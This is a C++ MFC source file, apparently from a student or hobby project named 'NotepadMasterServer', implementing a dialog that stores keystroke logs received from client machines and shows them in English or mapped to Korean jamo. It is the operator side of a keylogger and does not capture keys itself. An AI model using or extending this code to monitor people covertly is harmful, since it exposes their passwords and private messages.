// CClientKeylog.cpp: 구현 파일
//

#include "pch.h"
#include "NotepadMasterServer.h"
#include "CClientKeylog.h"
#include "afxdialogex.h"

#include "definition.h"

// CClientKeylog 대화 상자

IMPLEMENT_DYNAMIC(CClientKeylog, CDialogEx)

CClientKeylog::CClientKeylog(CString process_name, CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_CLIENT_KEYLOG, pParent)
	, m_keylog_lang(0)
{
	this->process_name = process_name;
	m_client_keylog = _T("");
	m_client_keylog_ko = _T("");
}

CClientKeylog::~CClientKeylog()
{
}

void CClientKeylog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CLIENT_KEYLOG, m_edit_client_keylog);
	DDX_Radio(pDX, IDC_RADIO_KEYLOG_EN, m_keylog_lang);
}


BEGIN_MESSAGE_MAP(CClientKeylog, CDialogEx)
	ON_CONTROL_RANGE(BN_CLICKED, IDC_RADIO_KEYLOG_EN, IDC_RADIO_KEYLOG_KO, &CClientKeylog::OnClickedRadioKeylogEn)
	ON_EN_VSCROLL(IDC_EDIT_CLIENT_KEYLOG, &CClientKeylog::OnVscrollEditClientKeylog)
END_MESSAGE_MAP()


// CClientKeylog 메시지 처리기

BOOL CClientKeylog::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  여기에 추가 초기화 작업을 추가합니다.
	m_edit_client_keylog.SetSel(-1, -1, FALSE);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 예외: OCX 속성 페이지는 FALSE를 반환해야 합니다.
}

CString CClientKeylog::GetProcessName()
{
	// TODO: 여기에 구현 코드 추가.
	return process_name;
}

// 내부 키로그 데이터 출력
void CClientKeylog::PrintKeylog()
{
	// TODO: 여기에 구현 코드 추가.
	UpdateData(TRUE);

	SCROLLINFO sc_info;
	m_edit_client_keylog.GetScrollInfo(SB_VERT, &sc_info);

	// 영어 / 한국어 옵션 선택 가능
	switch (m_keylog_lang)
	{
	case 0 :
		m_edit_client_keylog.SetWindowTextW(m_client_keylog);
		break;
	case 1 : 
		m_edit_client_keylog.SetWindowTextW(m_client_keylog_ko);
		break;
	}

	m_edit_client_keylog.LineScroll(sc_info.nPos); // 원래 보고 있던 위치로 자동 스크롤
}

// 내부에 키로그 데이터 저장
void CClientKeylog::ScanKeylog(PDUKeylog* pdu)
{
	// TODO: 여기에 구현 코드 추가.

	// ABC순으로 각 알파벳에 대응되는 자모음을 저장
	const WCHAR koreans_lowercase[] = { 
		L'ㅁ', L'ㅠ', L'ㅊ', L'ㅇ', L'ㄷ', L'ㄹ', L'ㅎ', L'ㅗ',
		L'ㅑ', L'ㅓ', L'ㅏ', L'ㅣ', L'ㅡ', L'ㅜ', L'ㅐ', L'ㅔ',
		L'ㅂ', L'ㄱ', L'ㄴ', L'ㅅ', L'ㅕ', L'ㅍ', L'ㅈ', L'ㅌ',
		L'ㅛ', L'ㅋ'
	};
	const WCHAR koreans_uppercase[] = {  // 이건 쉬프트 눌렀을때의 경우(쌍자음, 쌍모음)
		L'ㅁ', L'ㅠ', L'ㅊ', L'ㅇ', L'ㄸ', L'ㄹ', L'ㅎ', L'ㅗ',
		L'ㅑ', L'ㅓ', L'ㅏ', L'ㅣ', L'ㅡ', L'ㅜ', L'ㅒ', L'ㅖ',
		L'ㅃ', L'ㄲ', L'ㄴ', L'ㅆ', L'ㅕ', L'ㅍ', L'ㅉ', L'ㅌ',
		L'ㅛ', L'ㅋ'
	};
	if (pdu->state == VK_RETURN) // Line Feed 이면
	{
		m_client_keylog += L"\x0a\x0d"; // CRLF로 만들어줌
		m_client_keylog_ko += L"\x0a\x0d"; // CRLF로 만들어줌
	}
	else
	{
		m_client_keylog += pdu->state; // 내부에 키로그 기록

		/* 영어 말고 한국어로도 따로 파싱 */

		// 들어온 키로그가 알파벳 소문자라면
		if (0x61 <= pdu->state && pdu->state <= 0x7a)
			m_client_keylog_ko += koreans_lowercase[pdu->state - 0x61]; // 소문자 사전에서 참조

		// 대문자라면
		else if (0x41 <= pdu->state && pdu->state <= 0x5A)
			m_client_keylog_ko += koreans_uppercase[pdu->state - 0x41]; // 대문자 사전에서 참조

		// 그것도 아니면 특수문자이다
		else
			m_client_keylog_ko += pdu->state;
	}
}


void CClientKeylog::OnClickedRadioKeylogEn(UINT uiID)
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	PrintKeylog();
}


void CClientKeylog::OnVscrollEditClientKeylog()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
}
